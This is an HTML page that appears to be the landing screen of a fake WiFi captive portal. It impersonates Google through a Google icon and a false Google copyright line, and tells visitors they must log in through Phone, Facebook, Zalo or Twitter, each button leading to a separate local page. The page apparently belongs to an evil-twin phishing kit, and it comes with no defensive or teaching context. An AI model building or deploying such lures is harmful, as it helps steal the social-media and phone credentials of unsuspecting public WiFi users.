<html>
<meta charset="utf-8">
<meta name=viewport content="width=device-width, initial-scale=0.8, minimal-ui">
<meta name=description content="Free Highspeed Wifi">
<meta name=theme-color content="#36393E" />
<title>Free Highspeed Wifi</title>
<link rel=stylesheet href=style.css>
<script src="js/site.js"></script>

<body onload="loadLang()" style="background-color:rgb(255, 251, 251);">
    <div class=container>
        <div class=row>
            <div class=col-12>
                <!-- <h1 class=header data-translate=warning>THÔNG BÁO</h1> -->
                <img src="./images/google_icon.png" alt="Girl in a jacket" style="display: block;
                margin-left: auto;
                margin-right: auto;
                width: 100px;
                height: 100px;">
                <br>
                <p class="centered" data-translate="all_disclaimer">
                    You are connected to WiFi. <br>
                    To access internet please choose a authentication method.
                </p>
                <br>
                <div class="box">
                    <form action="phone.html">
                        <button data-translate="phone_value_btn" value="Continue with Phone" class="phone">Continue with Phone</button>
                    </form>
                    <form action="facebook.html">
                        <button data-translate="facebook_value_btn" value="Continue with Facebook"
                            class="facebook">Continue with Facebook</button>
                    </form>

                    <form action="zalo.html">
                        <button data-translate="zalo_value_btn" value="Continue with Zalo" class="zalo">Continue with Zalo</button>
                    </form>

                    <form action="twitter.html">

                        <button data-translate="twitter_value_btn" value="Continue with Twitter"
                            class="twitter">Continue with Twitter</button>
                    </form>


                    <div id=copyright> Copyright (c) 2019 Google<br> <a href="google.com" target=_blank></a> </div>
                </div>
                <!-- <div id=copyright> Copyright (c) 2019 Google<br> <a href="google.com" target=_blank></a> </div> -->
            </div>
        </div>
    </div>
</body>

</html>
